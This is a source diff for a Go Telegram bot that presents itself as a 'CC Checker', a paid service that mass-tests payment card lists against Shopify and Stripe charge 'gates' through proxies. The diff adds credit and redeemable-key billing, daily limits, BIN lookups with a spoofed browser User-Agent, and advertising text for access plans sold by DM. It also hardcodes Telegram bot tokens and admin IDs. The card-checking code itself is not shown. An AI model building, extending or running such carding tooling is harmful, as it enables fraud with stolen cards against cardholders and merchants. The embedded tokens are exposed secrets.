@@ -5,9 +5,12 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"html"
 	"io"
 	"math/rand"
+	"mime/multipart"
 	"net/http"
+	"net/textproto"
 	"net/url"
 	"os"
 	"sort"
@@ -20,20 +23,45 @@ import (
 	tele "gopkg.in/telebot.v4"
 )
 
-// ──────────────────────── config ────────────────────────────────────
 
-const botToken = "8958665612:AAHmuyPJ8ls_TKA0V-eDnPtVFTFfignvqhk"
+const botToken = "8903697089:AAEvpTKHTkZcLOkAMKDqZBLRr7flZzoEP-A"
+const logsGroupID = -1004545134344
 const usersFile = "users.json"
 const configFile = "botconfig.json"
 const sitesFile = "customsites.json"
+const keysFile = "customkeys.json"
 
 var adminIDs = map[int64]bool{
 	5733576801: true,
 	6466522004: true,
 }
 
-// cfg is package-level so isAdmin and handlers can access it.
 var cfg *BotConfig
+var km *KeyManager
+var fjRetryBtn tele.Btn
+var ledger *Ledger
+var qualityCheck = true
+
+const (
+	creditCostCharged  = 2.0
+	creditCostApproved = 1.0
+	minCreditsForCheck = 2.0
+)
+
+var dailyFreeLimit int64 = 1000
+
+func allAdminIDs() []int64 {
+	ids := make([]int64, 0, len(adminIDs))
+	for id := range adminIDs {
+		ids = append(ids, id)
+	}
+	if cfg != nil {
+		cfg.mu.RLock()
+		ids = append(ids, cfg.DynamicAdmins...)
+		cfg.mu.RUnlock()
+	}
+	return ids
+}
 
 func isAdmin(uid int64) bool {
 	if adminIDs[uid] {
@@ -51,20 +79,30 @@ func isAdmin(uid int64) bool {
 	return false
 }
 
-// ──────────────────────── Bot config ────────────────────────────────
 
 type BotConfig struct {
-	mu            sync.RWMutex
-	BannedUsers   map[int64]bool      `json:"banned_users"`
-	AllowedUsers  map[int64]bool      `json:"allowed_users"`
-	PvtOnly       bool                `json:"pvt_only"`
-	BlockedIDs    []int64             `json:"blocked_ids"`
-	AllowOnlyIDs  []int64             `json:"allow_only_ids"`
-	RestrictAll   bool                `json:"restrict_all"`
-	Groups        []int64             `json:"groups"`
-	GroupsOnly    bool                `json:"groups_only"`
-	DynamicAdmins []int64             `json:"dynamic_admins"`
-	Perms         map[string][]string `json:"perms"`
+	mu               sync.RWMutex
+	BannedUsers      map[int64]bool      `json:"banned_users"`
+	AllowedUsers     map[int64]bool     `json:"allowed_users"`
+	PvtOnly          bool                `json:"pvt_only"`
+	BlockedIDs       []int64             `json:"blocked_ids"`
+	AllowOnlyIDs     []int64             `json:"allow_only_ids"`
+	RestrictAll      bool                `json:"restrict_all"`
+	Groups           []int64             `json:"groups"`
+	GroupsOnly       bool                `json:"groups_only"`
+	DynamicAdmins    []int64             `json:"dynamic_admins"`
+	Perms            map[string][]string `json:"perms"`
+	FreeMode         bool                `json:"free_mode"`
+	DailyLimit       int64               `json:"daily_limit"`
+	ForceJoin        []ForceJoinTarget   `json:"force_join"`
+	ForceJoinEnabled bool                `json:"force_join_enabled"`
+	DefaultCredits   float64             `json:"default_credits"`
+}
+
+type ForceJoinTarget struct {
+	ChatID    int64  `json:"chat_id"`
+	InviteURL string `json:"invite_url"`
+	Title     string `json:"title"`
 }
 
 func NewBotConfig() *BotConfig {
@@ -72,6 +110,7 @@ func NewBotConfig() *BotConfig {
 		BannedUsers:  make(map[int64]bool),
 		AllowedUsers: make(map[int64]bool),
 		Perms:        make(map[string][]string),
+		DailyLimit:   1000,
 	}
 }
 
@@ -102,6 +141,9 @@ func (bc *BotConfig) Load() {
 	if bc.Perms == nil {
 		bc.Perms = make(map[string][]string)
 	}
+	if bc.DailyLimit <= 0 {
+		bc.DailyLimit = 1000
+	}
 }
 
 func (bc *BotConfig) IsBanned(uid int64) bool {
@@ -116,13 +158,11 @@ func (bc *BotConfig) IsAllowed(uid int64, isPrivate bool) bool {
 	}
 	bc.mu.RLock()
 	defer bc.mu.RUnlock()
-	// BlockedIDs — restricted via /restrict <id>
 	for _, bid := range bc.BlockedIDs {
 		if bid == uid {
 			return false
 		}
 	}
-	// RestrictAll — only AllowOnlyIDs can access
 	if bc.RestrictAll {
 		found := false
 		for _, aid := range bc.AllowOnlyIDs {
@@ -135,19 +175,15 @@ func (bc *BotConfig) IsAllowed(uid int64, isPrivate bool) bool {
 			return false
 		}
 	}
-	// GroupsOnly — deny private chats unless user is in AllowedUsers
 	if bc.GroupsOnly && isPrivate && !bc.AllowedUsers[uid] {
 		return false
 	}
-	// PvtOnly
 	if bc.PvtOnly && !bc.AllowedUsers[uid] {
 		return false
 	}
 	return true
 }
 
-// hasPerm returns true if uid has permission for the given command
-// (admins always have permission).
 func hasPerm(uid int64, cmd string) bool {
 	if isAdmin(uid) {
 		return true
@@ -166,7 +202,6 @@ func hasPerm(uid int64, cmd string) bool {
 	return false
 }
 
-// ──────────────────────── BIN lookup ────────────────────────────────
 
 type BINInfo struct {
 	Brand       string `json:"brand"`
@@ -178,45 +213,44 @@ type BINInfo struct {
 	CountryFlag string `json:"country_flag"`
 }
 
-var binCache sync.Map // string (first6) → *BINInfo
+var binCache sync.Map // string (first6) -> *BINInfo
 
-func lookupBIN(bin string) *BINInfo {
+func lookupBIN(bin string, lineNum int) *BINInfo {
 	if len(bin) < 6 {
-		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
+		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
 	}
 	first6 := bin[:6]
-	if v, ok := binCache.Load(first6); ok {
-		return v.(*BINInfo)
-	}
-	cl := &http.Client{Timeout: 5 * time.Second}
-	resp, err := cl.Get("https://bins.antipublic.cc/bins/" + first6)
+	ua := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", 100+lineNum)
+	req, err := http.NewRequest("GET", "https://bins.antipublic.dev/bins/"+first6, nil)
 	if err != nil {
-		info := &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
-		binCache.Store(first6, info)
-		return info
+		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
+	}
+	req.Header.Set("User-Agent", ua)
+	cl := &http.Client{Timeout: 5 * time.Second}
+	resp, err := cl.Do(req)
+	if err != nil {
+		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
 	}
 	defer resp.Body.Close()
 	body, _ := io.ReadAll(resp.Body)
 	var info BINInfo
 	if json.Unmarshal(body, &info) != nil {
-		info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
+		info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: ""}
 	}
 	if info.CountryFlag == "" {
 		info.CountryFlag = countryFlag(info.CountryCode)
 	}
-	binCache.Store(first6, &info)
 	return &info
 }
 
 func countryFlag(code string) string {
 	if len(code) != 2 {
-		return "🏳️"
+		return ""
 	}
 	code = strings.ToUpper(code)
 	return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
 }
 
-// ──────────────────────── Premium emoji helpers ──────────────────────
 
 func em(id, fallback string) string {
 	return `<tg-emoji emoji-id="` + id + `">` + fallback + `</tg-emoji>`
@@ -240,7 +274,6 @@ const (
 	emojiWarn      = "5447644880824181073"
 	emojiClock     = "5780616017197667562"
 
-	// /start message emojis
 	emojiBot       = "5352994912700762383"
 	emojiWave      = "5947013302331640354"
 	emojiList      = "5222444124698853913"
@@ -253,7 +286,6 @@ const (
 	emojiPwr       = "5456140674028019486"
 	emojiPwrStart  = "5429265105151879015"
 
-	// /stats message emojis
 	emojiRowCheck = "5197269100878907942"
 	emojiRowAppr  = "5352658337588612223"
 	emojiRowDecl  = "5355169587786713125"
@@ -263,16 +295,37 @@ const (
 	emojiPctAppr  = "6084779072750097974"
 	emojiPwrStats = "5195033767969839232"
 
-	// /active message emojis
 	emojiLive = "5256134032852278918"
 	emojiTime = "5413704112220949842"
 
-	// /start card emojis
 	emojiStar     = "5386757680679377085"
 	emojiCalendar = "6136500366008649837"
+
+	emojiHitStar      = "5217822164362739968"
+	emojiHitDetect    = "5877395722164247324"
+	emojiHitChannel   = "5352585602317426381"
+	emojiHitShield    = "5206607081334906820"
+	emojiHitGear      = "5296369303661067030"
+	emojiHitLock      = "5039614900280754969"
+	emojiHitKey       = "5042328396193864923"
+	emojiHitWarn      = "5447644880824181073"
+	emojiHitChart     = "5039778134807806727"
+	emojiHitList      = "5039671744172917707"
+	emojiHitTrash     = "5042334757040423886"
+	emojiHitCoin      = "5409048419211682843"
+	emojiHitBan       = "5041975203853239332"
+	emojiHitSync      = "5042290883949495533"
+	emojiHitGlobe     = "5999317873623831250"
+	emojiHitMegaphone = "5039891861246838069"
+	emojiHitNote      = "5039649904264217620"
+	emojiHitMagnet    = "5039600026809009149"
+	emojiHdrBot       = "5298970748172385213"
+	emojiHdrClock     = "5039623284056917259"
+	emojiHdrBars      = "4936468614967460670"
+	emojiHdrCrown     = "5427168083074628963"
+	emojiHdrFire      = "5040030395416969985"
 )
 
-// ──────────────────────── User / persistence ────────────────────────
 
 type UserStats struct {
 	TotalChecked    int64   `json:"total_checked"`
@@ -283,8 +336,13 @@ type UserStats struct {
 }
 
 type UserData struct {
-	Proxies []string  `json:"proxies"`
-	Stats   UserStats `json:"stats"`
+	Proxies      []string  `json:"proxies"`
+	Stats        UserStats `json:"stats"`
+	Credits      float64   `json:"credits"`
+	Username     string    `json:"username,omitempty"`
+	DailyCount   int64     `json:"daily_count"`
+	DailyDate    string    `json:"daily_date"`
+	UnlimitedUntil int64   `json:"unlimited_until"`
 }
 
 type UserManager struct {
@@ -307,6 +365,11 @@ func (um *UserManager) Get(uid int64) *UserData {
 	defer um.mu.Unlock()
 	if um.users[uid] == nil {
 		um.users[uid] = &UserData{}
+		if cfg != nil {
+			cfg.mu.RLock()
+			um.users[uid].Credits = cfg.DefaultCredits
+			cfg.mu.RUnlock()
+		}
 	}
 	return um.users[uid]
 }
@@ -344,13 +407,328 @@ func (um *UserManager) AllIDs() []int64 {
 	return ids
 }
 
-// ──────────────────────── Check session ─────────────────────────────
+func (um *UserManager) SetUsername(uid int64, username string) {
+	um.mu.Lock()
+	defer um.mu.Unlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		ud = &UserData{}
+		um.users[uid] = ud
+	}
+	if username != "" {
+		ud.Username = username
+	}
+}
+
+func (um *UserManager) GetCredits(uid int64) float64 {
+	um.mu.RLock()
+	defer um.mu.RUnlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		return 0
+	}
+	return ud.Credits
+}
+
+func (um *UserManager) HasCredits(uid int64) bool {
+	um.mu.RLock()
+	defer um.mu.RUnlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		return false
+	}
+	return ud.Credits >= minCreditsForCheck
+}
+
+func (um *UserManager) AddCredits(uid int64, amount float64) float64 {
+	um.mu.Lock()
+	defer um.mu.Unlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		ud = &UserData{}
+		um.users[uid] = ud
+	}
+	ud.Credits += amount
+	return ud.Credits
+}
+
+func (um *UserManager) DeductCredits(uid int64, amount float64) {
+	um.mu.Lock()
+	defer um.mu.Unlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		ud = &UserData{}
+		um.users[uid] = ud
+	}
+	ud.Credits -= amount
+}
+
+func currentDailyLimit() int64 {
+	if cfg != nil {
+		cfg.mu.RLock()
+		limit := cfg.DailyLimit
+		free := cfg.FreeMode
+		cfg.mu.RUnlock()
+		if free {
+			return 1 << 62
+		}
+		if limit > 0 {
+			return limit
+		}
+	}
+	return dailyFreeLimit
+}
+
+func (um *UserManager) GetDailyCount(uid int64) int64 {
+	um.mu.RLock()
+	defer um.mu.RUnlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		return 0
+	}
+	today := time.Now().Format("2006-01-02")
+	if ud.DailyDate != today {
+		return 0
+	}
+	return ud.DailyCount
+}
+
+func (um *UserManager) IncDailyChecked(uid int64) (int64, bool) {
+	um.mu.Lock()
+	defer um.mu.Unlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		ud = &UserData{}
+		um.users[uid] = ud
+	}
+	today := time.Now().Format("2006-01-02")
+	if ud.DailyDate != today {
+		ud.DailyDate = today
+		ud.DailyCount = 0
+	}
+	ud.DailyCount++
+	return ud.DailyCount, ud.DailyCount <= currentDailyLimit()
+}
+
+func (um *UserManager) SetUnlimited(uid int64, untilUnix int64) {
+	um.mu.Lock()
+	defer um.mu.Unlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		ud = &UserData{}
+		um.users[uid] = ud
+	}
+	ud.UnlimitedUntil = untilUnix
+}
+
+func (um *UserManager) HasUnlimited(uid int64) bool {
+	um.mu.RLock()
+	defer um.mu.RUnlock()
+	ud, ok := um.users[uid]
+	if !ok {
+		return false
+	}
+	return ud.UnlimitedUntil > time.Now().Unix()
+}
+
+func (um *UserManager) FindByUsername(username string) (int64, bool) {
+	needle := strings.ToLower(strings.TrimPrefix(strings.TrimSpace(username), "@"))
+	if needle == "" {
+		return 0, false
+	}
+	um.mu.RLock()
+	defer um.mu.RUnlock()
+	for id, ud := range um.users {
+		if strings.ToLower(ud.Username) == needle {
+			return id, true
+		}
+	}
+	return 0, false
+}
+
+
+type Key struct {
+	Code        string `json:"code"`
+	Type        string `json:"type"`
+	Credits     int64  `json:"credits"`
+	Duration    string `json:"duration"`
+	CreatedAt   int64  `json:"created_at"`
+	ActivatedAt int64  `json:"activated_at,omitempty"`
+	ActivatedBy int64  `json:"activated_by,omitempty"`
+	ExpiresAt   int64  `json:"expires_at,omitempty"`
+	Active      bool   `json:"active"`
+}
+
+type KeyManager struct {
+	mu      sync.RWMutex
+	keys    map[string]*Key
+	history []*Key
+}
+
+func NewKeyManager() *KeyManager {
+	return &KeyManager{keys: make(map[string]*Key)}
+}
+
+func (k *KeyManager) Load() {
+	data, err := os.ReadFile(keysFile)
+	if err != nil {
+		return
+	}
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	var keys []*Key
+	if json.Unmarshal(data, &keys) != nil {
+		return
+	}
+	k.keys = make(map[string]*Key)
+	k.history = nil
+	for _, key := range keys {
+		k.history = append(k.history, key)
+		k.keys[key.Code] = key
+	}
+}
+
+func (k *KeyManager) Save() {
+	k.mu.RLock()
+	data, _ := json.MarshalIndent(k.history, "", "  ")
+	k.mu.RUnlock()
+	tmp := keysFile + ".tmp"
+	if os.WriteFile(tmp, data, 0644) == nil {
+		os.Rename(tmp, keysFile)
+	}
+}
+
+func (k *KeyManager) Generate(keyType string, credits int64, duration string) (*Key, error) {
+	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, 6)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	code := "SHADOW-CHK-" + string(b)
+	key := &Key{
+		Code:     code,
+		Type:     keyType,
+		Credits:  credits,
+		Duration: duration,
+		CreatedAt: time.Now().Unix(),
+		Active:   true,
+	}
+	k.mu.Lock()
+	k.keys[code] = key
+	k.history = append(k.history, key)
+	k.mu.Unlock()
+	k.Save()
+	return key, nil
+}
+
+func (k *KeyManager) Redeem(code string, uid int64) (*Key, error) {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	key, ok := k.keys[code]
+	if !ok {
+		return nil, fmt.Errorf("invalid key")
+	}
+	if !key.Active {
+		return nil, fmt.Errorf("key is deactivated")
+	}
+	if key.ActivatedAt > 0 && key.Type == "credits" {
+		return nil, fmt.Errorf("key already redeemed")
+	}
+	if key.Type == "unlimited" && key.ActivatedAt > 0 && key.ExpiresAt > time.Now().Unix() {
+		return nil, fmt.Errorf("key already active")
+	}
+	now := time.Now()
+	key.ActivatedAt = now.Unix()
+	key.ActivatedBy = uid
+	if durationHours, err := strconv.Atoi(key.Duration); err == nil && durationHours > 0 {
+		key.ExpiresAt = now.Add(time.Duration(durationHours) * time.Hour).Unix()
+	} else if key.Duration == "permanent" {
+		key.ExpiresAt = 0
+	}
+	k.Save()
+	return key, nil
+}
+
+func (k *KeyManager) Active() []*Key {
+	k.mu.RLock()
+	defer k.mu.RUnlock()
+	var out []*Key
+	for _, key := range k.keys {
+		if key.Active && key.ActivatedAt == 0 {
+			out = append(out, key)
+		}
+	}
+	return out
+}
+
+func (k *KeyManager) AllHistory() []*Key {
+	k.mu.RLock()
+	defer k.mu.RUnlock()
+	out := make([]*Key, len(k.history))
+	copy(out, k.history)
+	return out
+}
+
+func (k *KeyManager) Deactivate(code string) bool {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	key, ok := k.keys[code]
+	if !ok {
+		return false
+	}
+	key.Active = false
+	k.Save()
+	return true
+}
+
+func (k *KeyManager) DeactivateAll() int {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	count := 0
+	for _, key := range k.keys {
+		if key.Active {
+			key.Active = false
+			count++
+		}
+	}
+	k.Save()
+	return count
+}
+
+func (k *KeyManager) Delete(code string) bool {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	key, ok := k.keys[code]
+	if !ok {
+		return false
+	}
+	delete(k.keys, code)
+	for i, h := range k.history {
+		if h == key {
+			k.history = append(k.history[:i], k.history[i+1:]...)
+			break
+		}
+	}
+	k.Save()
+	return true
+}
+
+func (k *KeyManager) DeleteAll() int {
+	k.mu.Lock()
+	defer k.mu.Unlock()
+	count := len(k.keys)
+	k.keys = make(map[string]*Key)
+	k.history = nil
+	k.Save()
+	return count
+}
 
 type CheckSession struct {
-	UserID       int64
-	Username     string
-	SessionID    string
-	Cards        []string
+	UserID          int64
+	Username        string
+	SessionID       string
+	Cards           []string
+	OriginalIndices []int
 	Total        int
 	Checked      atomic.Int64
 	Charged      atomic.Int64
@@ -360,6 +738,7 @@ type CheckSession struct {
 	StartTime    time.Time
 	Cancel       context.CancelFunc
 	Cancelled    atomic.Bool
+	Stopped      atomic.Bool
 	Done         chan struct{}
 	ShowDecl     bool   // true for /sh, false for /txt
 	ShowApproved bool   // true to send approved cards in chat
@@ -367,6 +746,9 @@ type CheckSession struct {
 
 	chargedAmtMu sync.Mutex
 	chargedAmt   float64
+
+	outputMu sync.Mutex
+	ledger   *Ledger
 }
 
 func (s *CheckSession) AddChargedAmt(v float64) {
@@ -394,31 +776,29 @@ func generateSessionID() string {
 	return string(b)
 }
 
-var activeSessions sync.Map // int64 (userID) → *CheckSession
+var activeSessions sync.Map // int64 (userID) -> *CheckSession
 
-// ──────────────────────── Pending /txt sessions (awaiting Yes/No) ───
 
 type txtPendingData struct {
-	Cards    []string
-	ChatID   int64
-	Username string
-	GateName string
-	CheckFn  stripeCheckFn
+	Cards           []string
+	OriginalIndices []int
+	ChatID          int64
+	Username        string
+	GateName        string
+	CheckFn         stripeCheckFn
 }
 
 var (
 	txtPendingMu sync.Mutex
-	txtPending   = map[int64]*txtPendingData{} // userID → pending data
+	txtPending   = map[int64]*txtPendingData{} // userID -> pending data
 )
 
-// ──────────────────────── Custom sites ─────────────────────────
 
 var (
 	customSitesMu sync.RWMutex
 	customSites   []string
 )
 
-// ──────────────────────── Blacklisted (test) sites ─────────────
 
 var (
 	blacklistMu sync.RWMutex
@@ -469,7 +849,6 @@ func getCustomSites() []string {
 	return cp
 }
 
-// ──────────────────────── Site pool ─────────────────────────────────
 
 var (
 	sitePoolMu sync.RWMutex
@@ -509,7 +888,6 @@ func refreshSitePool() {
 
 func getSitePool() []string {
 	var raw []string
-	// Prefer custom sites if any are set
 	if cs := getCustomSites(); len(cs) > 0 {
 		raw = cs
 	} else {
@@ -518,7 +896,6 @@ func getSitePool() []string {
 		copy(raw, sitePool)
 		sitePoolMu.RUnlock()
 	}
-	// Filter out blacklisted test stores
 	filtered := make([]string, 0, len(raw))
 	for _, s := range raw {
 		if !isBlacklisted(s) {
@@ -528,102 +905,101 @@ func getSitePool() []string {
 	return filtered
 }
 
-// ──────────────────────── Message templates ─────────────────────────
 
-func formatWelcomeCard(uid int64, username string, proxyCount int) string {
-	return "━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"STATUS → " + em(emojiCheck, "✅") + " <b>Active</b> " + em(emojiCheck, "✅") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		em(emojiBlue, "🔵") + " <b>ID</b> → <code>" + strconv.FormatInt(uid, 10) + "</code>\n" +
-		em(emojiUser, "👤") + " <b>User</b> → @" + username + "\n" +
-		em(emojiStar, "⭐") + " <b>Bot</b> → CC Checker\n" +
-		em(emojiCalendar, "📅") + " <b>Proxies</b> → " + strconv.Itoa(proxyCount) + " loaded\n" +
-		em(emojiLightning, "⚡") + " <b>Owner</b> → @aldorsi\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━"
+func formatWelcomeCard(uid int64, username string, proxyCount int, credits float64) string {
+	return "====================\n" +
+		"STATUS -> " + em(emojiCheck, "\xe2\x9c\x85") + " <b>Active</b> " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
+		"====================\n" +
+		em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b>ID</b> -> <code>" + strconv.FormatInt(uid, 10) + "</code>\n" +
+		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> @" + html.EscapeString(username) + "\n" +
+		em(emojiStar, "\xe2\xad\x90") + " <b>Bot</b> -> CC Checker\n" +
+		em(emojiCalendar, "\xf0\x9f\x93\x85") + " <b>Proxies</b> -> " + strconv.Itoa(proxyCount) + " loaded\n" +
+		em(emojiPrice, "\xf0\x9f\x92\xb0") + " <b>Credits</b> -> " + strconvFloat(credits) + "\n" +
+		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001\n" +
+		"===================="
 }
 
 func formatGatesMsg() string {
-	return "━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"  " + em(emojiCharged, "🔥") + " 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗚𝗮𝘁𝗲𝘀 " + em(emojiCharged, "🔥") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-		em(emojiCmdSh, "🔫") + " <b>Shopify Auto Charge</b>\n" +
-		"└ /sh &lt;cc list&gt;\n\n" +
-		em(emojiCharged, "🔥") + " <b>Stripe Auth</b> (UK, no charge)\n" +
-		"└ /str  /mstr  /mstrtxt\n\n" +
-		em(emojiCharged, "🔥") + " <b>Stripe UHQ $1 GBP</b>\n" +
-		"└ /str1  /mstr1  /mstr1txt\n\n" +
-		em(emojiCharged, "🔥") + " <b>Stripe UHQ $5 NZD</b>\n" +
-		"└ /str2  /mstr2  /mstr2txt\n\n" +
-		em(emojiCharged, "🔥") + " <b>Stripe Donation $3 USD</b>\n" +
-		"└ /str4  /mstr4  /mstr4txt\n\n" +
-		em(emojiCharged, "🔥") + " <b>Stripe $1 USD</b>\n" +
-		"└ /str5  /mstr5  /mstr5txt\n\n" +
-		em(emojiCmdTxt, "📎") + " <b>Mass AutoShopify</b>\n" +
-		"└ /txt\n\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━"
+	return "====================\n" +
+		em(emojiCmdStats, "\xf0\x9f\x93\x8a") + " Gates Commands\n" +
+		"====================\n\n" +
+		em(emojiCharged, "\xe2\x9c\x85") + " <b>Shopify Checker</b>\n" +
+		"  Cmd: <code>/sh</code>  |  <code>/txt</code>\n" +
+		"  Status: Active " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
+		"===================="
 }
 
 func formatPricingMsg() string {
-	return "💥 <b>Available Access Plans</b> 💥\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔 ⚡\n" +
-		"Duration ↬ 7 days\n" +
-		"Price ↬ DM\n" +
-		"Credits ↬ Unlimited until plan ends\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔 ⭐\n" +
-		"Duration ↬ 15 days\n" +
-		"Price ↬ DM\n" +
-		"Credits ↬ Unlimited until plan ends\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔 👑\n" +
-		"Duration ↬ 30 days\n" +
-		"Price ↬ DM\n" +
-		"Credits ↬ Unlimited until plan ends\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"𝑿-𝑨𝒄𝒄𝒆𝒔 👑\n" +
-		"Duration ↬ 90 days\n" +
-		"Price ↬ DM\n" +
-		"Credits ↬ Unlimited until plan ends\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-		"DM ↬ @aldorsi"
+	return "Available Access Plans\n" +
+		"--------------------\n" +
+		"Plan: 7 days\n" +
+		"  Duration: 7 days\n" +
+		"  Price: DM\n" +
+		"  Credits: Unlimited until plan ends\n" +
+		"--------------------\n" +
+		"Plan: 15 days\n" +
+		"  Duration: 15 days\n" +
+		"  Price: DM\n" +
+		"  Credits: Unlimited until plan ends\n" +
+		"--------------------\n" +
+		"Plan: 30 days\n" +
+		"  Duration: 30 days\n" +
+		"  Price: DM\n" +
+		"  Credits: Unlimited until plan ends\n" +
+		"--------------------\n" +
+		"Plan: 90 days\n" +
+		"  Duration: 90 days\n" +
+		"  Price: DM\n" +
+		"  Credits: Unlimited until plan ends\n" +
+		"--------------------\n\n" +
+		"DM -> @SORRY_00001"
 }
 
 func formatStartMsg() string {
-	return "━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"  " + em(emojiBot, "🤖") + " 𝗖𝗖 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁 " + em(emojiBot, "🤖") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-		em(emojiWave, "👋") + "  <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲!</b>  Use the commands\nbelow to get started.\n\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"  " + em(emojiList, "📖") + "  𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗶𝘀𝘁 " + em(emojiList, "📖") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-		em(emojiCmdSh, "🔫") + "  /sh &lt;cc list&gt;\n" +
-		"     ∟ Quick check up to 100 cards\n       Paste cards directly inline\n\n" +
-		em(emojiCharged, "🔥") + "  /str &lt;cc list&gt;  /mstr &lt;cc list&gt;  /mstrtxt\n" +
-		"     ∟ Stripe Auth (UK, no charge)\n       Inline or mass-txt\n\n" +
-		em(emojiCharged, "🔥") + "  /str1 &lt;cc list&gt;  /mstr1 &lt;cc list&gt;  /mstr1txt\n" +
-		"     ∟ Stripe UHQ $1 GBP (checkout)\n       Inline or mass-txt\n\n" +
-		em(emojiCharged, "🔥") + "  /str2 &lt;cc list&gt;  /mstr2 &lt;cc list&gt;  /mstr2txt\n" +
-		"     ∟ Stripe UHQ $5 NZD (SecondStork)\n       Inline or mass-txt\n\n" +
-		em(emojiCharged, "🔥") + "  /str4 &lt;cc list&gt;  /mstr4 &lt;cc list&gt;  /mstr4txt\n" +
-		"     ∟ Stripe Donation $3 USD\n       Inline or mass-txt\n\n" +
-		em(emojiCharged, "🔥") + "  /str5 &lt;cc list&gt;  /mstr5 &lt;cc list&gt;  /mstr5txt\n" +
-		"     ∟ Stripe $1 USD\n       Inline or mass-txt\n\n" +
-		em(emojiCmdTxt, "📎") + "  /txt\n" +
-		"     ∟ Reply to a .txt file to mass\n       check all cards inside it\n\n" +
-		em(emojiCmdSetpr, "🌐") + "  /setpr &lt;proxy&gt;\n" +
-		"     ∟ Add proxy(s) for checking\n       One per line, or a single proxy\n\n" +
-		em(emojiCmdRmpr, "🗑") + "  /rmpr &lt;proxy&gt;\n" +
-		"     ∟ Remove a specific proxy\n\n" +
-		em(emojiCmdRmpr, "🗑") + "  /rmpr all\n" +
-		"     ∟ Remove all saved proxies\n\n" +
-		em(emojiCmdStats, "📊") + "  /stats\n" +
-		"     ∟ View your personal usage\n       stats and hit rates\n\n" +
-		em(emojiCmdActive, "👥") + "  /active\n" +
-		"     ∟ See all users currently\n       checking with live progress\n\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━\n" +
-		"  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @aldorsi " + em(emojiPwrStart, "⚡") + "\n" +
-		"━━━━━━━━━━━━━━━━━━━━━━"
+	return "====================\n" +
+		"  " + em(emojiBot, "\xf0\x9f\xa4\x96") + " CC Checker Bot " + em(emojiBot, "\xf0\x9f\xa4\x96") + "\n" +
+		"--------------------\n\n" +
+		em(emojiWave, "\xf0\x9f\x91\x8b") + "  <b>Welcome!</b>  Use the commands\nbelow to get started.\n\n" +
+		"--------------------\n" +
+		"  " + em(emojiList, "\xf0\x9f\x93\x96") + " Command List " + em(emojiList, "\xf0\x9f\x93\x96") + "\n" +
+		"--------------------\n\n" +
+		em(emojiCmdSh, "\xe2\x9c\x85") + "  /sh &lt;cc list&gt;\n" +
+		"     Quick check up to 100 cards\n" +
+		"     Paste cards directly inline\n\n" +
